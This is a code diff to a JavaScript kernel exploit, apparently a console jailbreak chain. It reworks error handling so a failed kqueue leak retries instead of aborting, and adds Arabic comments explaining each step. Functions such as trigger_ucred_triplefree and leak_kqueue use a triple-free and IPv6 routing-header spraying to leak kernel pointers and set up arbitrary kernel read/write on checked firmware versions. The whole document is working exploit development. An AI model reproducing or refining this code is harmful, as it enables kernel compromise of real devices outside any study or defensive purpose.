@@ -209,14 +209,11 @@ function build_rthdr(buf, size) {
 function set_sockopt(sd, level, optname, optval, optlen) {
   var result = setsockopt(sd, level, optname, optval, optlen);
   if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
-    log('set_sockopt FAILED: sd=' + hex(sd) +
-        ' level=' + level +
-        ' optname=' + optname +
-        ' optlen=' + optlen);
     throw new Error('set_sockopt error: ' + hex(result));
   }
   return result;
 }
+
 // Global buffer to minimize footprint
 var sockopt_len_ptr = malloc(4);
 var nanosleep_timespec = malloc(0x10);
@@ -978,6 +975,7 @@ function netctrl_exploit() {
   setup_log_screen();
   var supported_fw = init();
   if (!supported_fw) {
+    log('Unsupported firmware, aborting.');
     return;
   }
   log('Setting up exploit...');
@@ -1017,9 +1015,8 @@ function exploit_phase_trigger() {
 
 function exploit_phase_leak() {
   if (!leak_kqueue_safe()) {
-    log('[leak_kqueue_safe] failed - aborting (no retry)');
-    cleanup(true);
-    if (typeof show_fail === 'function') show_fail();
+    log('[leak_kqueue_safe] failed, retrying...');
+    yield_to_render(exploit_phase_trigger);
     return;
   }
   log('Setting up arbitrary R/W...');
@@ -1539,14 +1536,13 @@ function trigger_ucred_triplefree() {
 function leak_kqueue() {
   debug('Leaking kqueue...');
 
-  if (typeof triplets[1] === 'undefined' ||
-      triplets[1] < 0 ||
-      triplets[1] >= ipv6_socks.length) {
+  // تأكيد صلاحية triplets[1] قبل استخدامه
+  if (typeof triplets[1] === 'undefined' || triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
     log('leak_kqueue: invalid triplets[1]');
     return false;
   }
 
-  // زي الأصلي: نحرر triplets[1] هنا
+  // نحرر triplets[1] عشان نستخدمه في التسريب
   free_rthdr(ipv6_socks[triplets[1]]);
 
   var kq = new BigInt(0);
@@ -1554,7 +1550,7 @@ function leak_kqueue() {
   var magic_add = leak_rthdr.add(0x08);
   var count = 0;
 
-  // خليه رقم معقول، مش 12000
+  // استخدام الثابت العالمي بدل MAX_KQ المحلي
   var MAX_KQ = 7000;
 
   while (count < MAX_KQ) {
@@ -1566,6 +1562,7 @@ function leak_kqueue() {
       return false;
     }
 
+    // تصفير جزء من leak_rthdr قبل القراءة (لتفادي بقايا قديمة)
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
 
@@ -1574,12 +1571,14 @@ function leak_kqueue() {
     var magic = read64(magic_add);
     var fdp   = read64(leak_rthdr.add(0x98));
 
+    // لو القراءة فاضية أو غير منطقية، نقفل kq ونكمل
     if (!magic.eq(magic_val) || fdp.eq(0)) {
       close(kq);
       sched_yield();
       continue;
     }
 
+    // وصلنا لقيمة صحيحة
     break;
   }
 
@@ -1598,12 +1597,15 @@ function leak_kqueue() {
 
   debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock));
 
+  // تأكيد إغلاق آخر kq مستخدم
   close(kq);
 
+  // إعادة بناء triplets[1] بعد ما استخدمناه في free
   triplets[1] = find_triplet(triplets[0], triplets[2]);
 
   return true;
 }
+
 function leak_kqueue_safe() {
   try {
     return leak_kqueue();
